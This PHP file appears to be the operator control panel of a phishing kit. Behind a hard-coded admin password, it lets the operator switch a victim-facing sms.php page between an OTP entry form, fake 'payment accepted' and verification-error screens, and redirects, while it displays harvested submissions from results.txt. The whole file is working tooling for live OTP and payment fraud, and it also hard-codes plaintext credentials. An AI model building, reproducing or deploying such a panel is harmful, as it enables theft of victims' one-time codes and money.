<?php
session_start();

$stateFile = __DIR__ . '/admin_state.json';
$resultsFile = __DIR__ . '/results.txt';

$validUser = 'admin';
$validPass = 'JJKadmin2026';
$message = '';

function loadSmsState($file)
{
    $defaults = [
        'mode' => 'default',
        'custom_url' => ''
    ];

    if (!file_exists($file)) {
        return $defaults;
    }

    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? array_merge($defaults, $data) : $defaults;
}

function saveSmsState($file, $mode, $customUrl)
{
    $payload = [
        'mode' => $mode,
        'custom_url' => $mode === 'redirect_custom' ? trim($customUrl) : ''
    ];

    file_put_contents($file, json_encode($payload, JSON_PRETTY_PRINT));
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if ($user === $validUser && $pass === $validPass) {
        $_SESSION['is_admin'] = true;
    } else {
        $message = 'Invalid username or password.';
    }
}

$isAdmin = !empty($_SESSION['is_admin']);

if ($isAdmin && isset($_POST['sms_mode'])) {
    $smsMode = $_POST['sms_mode'];
    $customUrl = $_POST['custom_url'] ?? '';

    saveSmsState($stateFile, $smsMode, $customUrl);
    $message = 'SMS page updated successfully.';
}

$currentState = loadSmsState($stateFile);
$resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 'No results saved yet.';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0b0b0b;
            color: #f5f5f5;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 900px;
            margin: 40px auto;
            background: #141414;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        h1, h2 {
            margin-top: 0;
        }

        .card {
            background: #1f1f1f;
            padding: 16px;
            border-radius: 6px;
            margin-bottom: 16px;
        }

        label {
            display: block;
            margin: 8px 0 4px;
        }

        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #333;
            background: #111;
            color: #f5f5f5;
        }

        button {
            padding: 10px 16px;
            border: none;
            border-radius: 4px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #b20710;
        }

        .message {
            padding: 12px;
            background: #1f3b1f;
            border: 1px solid #2e7d32;
            color: #b9f6ca;
            border-radius: 4px;
            margin-bottom: 12px;
        }

        .error {
            background: #3b1f1f;
            border: 1px solid #c62828;
            color: #ffcdd2;
        }

        pre {
            background: #0f0f0f;
            padding: 12px;
            border-radius: 4px;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .login-wrapper {
            max-width: 360px;
            margin: 80px auto;
        }

        .logout-link {
            display: inline-block;
            margin-top: 8px;
            color: #90caf9;
        }
    </style>
</head>
<body>
<?php if (!$isAdmin): ?>
    <div class="login-wrapper">
        <div class="card">
            <h1>Admin Login</h1>
            <?php if ($message): ?>
                <div class="message error"><?php echo htmlspecialchars($message); ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="hidden" name="action" value="login">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>

                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>

                <button type="submit">Login</button>
            </form>
        </div>
    </div>
<?php else: ?>
    <div class="container">
        <h1>Admin Panel</h1>
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        <a class="logout-link" href="?logout=1">Logout</a>

        <div class="card">
            <h2>SMS Page Controls</h2>
            <form method="post">
                <label for="sms_mode">Choose what sms.php should do</label>
                <select name="sms_mode" id="sms_mode" required>
                    <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
                    <option value="otp_pass" <?php echo $currentState['mode'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
                    <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
                    <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
                    <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
                    <option value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'selected' : ''; ?>>Show verification error</option>
                </select>

                <label for="custom_url">Custom redirect URL (only used for specific URL option)</label>
                <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">

                <button type="submit">Update SMS Page</button>
            </form>
        </div>

        <div class="card">
            <h2>Saved Results (results.txt)</h2>
            <pre><?php echo htmlspecialchars($resultsContent); ?></pre>
        </div>
    </div>
<?php endif; ?>
</body>
</html>
